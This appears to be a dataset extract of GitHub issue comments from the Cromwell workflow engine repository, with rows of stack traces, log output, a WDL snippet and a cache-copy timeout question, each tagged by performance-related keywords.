cromwell.engine.backend.local.LocalBackend$$anonfun$3.apply$mcI$sp(LocalBac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:5036,concurren,concurrent,5036,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,9-417b-b575-fc955c808983/WorkflowExecutionActor-d86697f6-ca39-417b-b575-fc955c808983/d86697f6-ca39-417b-b575-fc955c808983-EngineJobExecutionActor-DeliciousFileSpam.FileSpam:364:1/d86697f6-ca39-417b-b575-fc955c808983-BackendJobExecutionActor-d86697f6:DeliciousFileSpam.FileSpam:364:1/JesAsyncBackendJobExecutionActor: exception during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:30); at cromwell.backend.impl.jes.JesCallPaths.<init>(JesCallPaths.scala:16); at cromwell.backend.impl.jes.JesCallPaths$.apply(JesCallPaths.scala:11); at cromwell.backend.impl.jes.JesWorkflowPaths.toJesCallPaths(JesWo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1270,concurren,concurrent,1270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['concurren'],['concurrent']
Performance,9]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:892) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:892) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:886) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) [cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) [cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) [cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:10031,concurren,concurrent,10031,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,5,['concurren'],['concurrent']
Performance,"9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatter index: None, attempt 1); 2020-10-13 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7472,cache,cache,7472,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335,1,['cache'],['cache']
Performance,": Call w.hello, Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0: return code was (none). Full command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. java.lang.Throwable: Call w.hello, Workflow 2a89a995-aa89-4172-a5e1-1054cbccd9e0: return code was (none). Full command was: ""/bin/bash"" ""-c"" ""cat cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/script | /bin/bash <&0"". Contents of cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/stderr were empty. at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:246); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:144); at cromwell.engine.backend.local.LocalBackend$$anonfun$execute$1.apply(LocalBackend.scala:138); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixExc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:4543,concurren,concurrent,4543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['concurren'],['concurrent']
Performance,:+1: with existence cache removal. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1152/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232975937:20,cache,cache,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232975937,1,['cache'],['cache']
Performance,":0.19]; 3589858- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19]; 3589859- at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 3589864- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 3589865- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 3589866- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; 3589867- at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; 3589868- at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; 3589869- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 3589870- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 3589871- at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; 3589872- at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 3589873:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 INFO - WorkflowActor [UUID(129f0510)]: persisting status of CollectQualityYieldMetrics:2 to Failed.; 3589874:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-disp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:3871,concurren,concurrent,3871,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['concurren'],['concurrent']
Performance,":1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it o",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2767,cache,cache,2767,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance,:1.0.0-M1]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:69) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.Option.map(Option.scala:146) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Success.map(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[akka-actor_2,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472:2558,concurren,concurrent,2558,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472,1,['concurren'],['concurrent']
Performance,:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:11348,Concurren,ConcurrentRestrictions,11348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,7,"['Concurren', 'concurren']","['ConcurrentRestrictions', 'concurrent']"
Performance,"; File covar_names_out = covar_names; File pheno_readme_out = pheno_readme; }; }; ```. tasks.wdl; ```; version 1.0. # any input file with a default relative to the script_dir; # needs to be supplied by the user, it won't be the product of another task; # if input files to tasks can be supplied by another tasks output, ; # there will be a comment specifying; # task input files without comments need to be supplied by the user; # see the expanse workflow for where those are on expanse; # exception: sc (data showcase) tasks are labeled by data field id; # but do need to be supplied by the user. # output files from tasks will be commented with the location; # they reside on expanse; # this isn't necessary for understanding/running the WDL, just useful notes for myself; # for transitioning from snakemake to WDL. # sample_list file format; # first line is 'ID' (case insensitive); # every successive line is a sample ID. # TODO: set container for each task. ####################### Loading samples and phenotypes ####################. task write_sample_list {; input {; String script_dir; File script = ""~{script_dir}/sample_qc/scripts/write_sample_list.py"". File sc; Int? value; }. output {; File data = ""data.out""; }. command <<<; ~{script} ~{sc} data.out ~{""--value "" + value}; >>>. runtime {; shortTask: true; dx_timeout: ""5m""; }; }. task ethnic_sample_lists {; input {; String script_dir; File script = ""~{script_dir}/sample_qc/scripts/ethnicity.py""; File python_array_utils = ""~{script_dir}/sample_qc/scripts/python_array_utils.py"". File white_brits_sample_list # write_sample_list 22006; File sc_ethnicity_self_report # 21000; } . output {; # sample_qc/common_filters/ethnicity/{ethnicity}.sample; Array[String] ethnicities = [; ""black"",; ""south_asian"",; ""chinese"",; ""irish"",; ""white_other"",; ]; # These can be zipped together to form a map if desired; Array[File] sample_lists = [; ""black.sample"",; ""south_asian.sample"",; ""chinese.sample"",; ""irish.sample"",; ""white_other.sample"",; ]; }. c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269:8747,Load,Loading,8747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971#issuecomment-1355222269,1,['Load'],['Loading']
Performance,"; [2018-10-23 17:49:32,18] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-10-23 17:49:32,19] [info] JobExecutionTokenDispenser stopped; [2018-10-23 17:49:32,19] [info] WorkflowStoreActor stopped; [2018-10-23 17:49:32,20] [info] WorkflowLogCopyRouter stopped; [2018-10-23 17:49:32,20] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor All workflows finished; [2018-10-23 17:49:32,20] [info] Connection pools shut down; [2018-10-23 17:49:32,20] [info] WorkflowManagerActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] SubWorkflowStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] JobStoreActor stopped; [2018-10-23 17:49:32,21] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-10-23 17:49:32,21] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-10-23 17:49:32,21] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-10-23 17:49:32,22] [info] ServiceRegistryActor stopped; [2018-10-23 17:49:32,22] [info] CallCacheWriteActor stopped; [2018-10-23 17:49:32,23] [info] DockerHashActor stopped; [2018-10-23 17:49:32,23] [info] IoProxy stopped; [2018-10-23 17:49:32,26] [info] Database closed; [2018-10-23 17:49:32,26] [info] Stream materializer shut down; [2018-10-23 17:49:32,27] [info] WDL HTTP import resolver closed; Workflow d186ca94-b85b-4729-befc-8ad28a05976c transitioned to state Failed; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:8609,queue,queued,8609,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,3,['queue'],['queued']
Performance,; at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Even,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4756,concurren,concurrent,4756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['concurren'],['concurrent']
Performance,"; at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5482,concurren,concurrent,5482,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
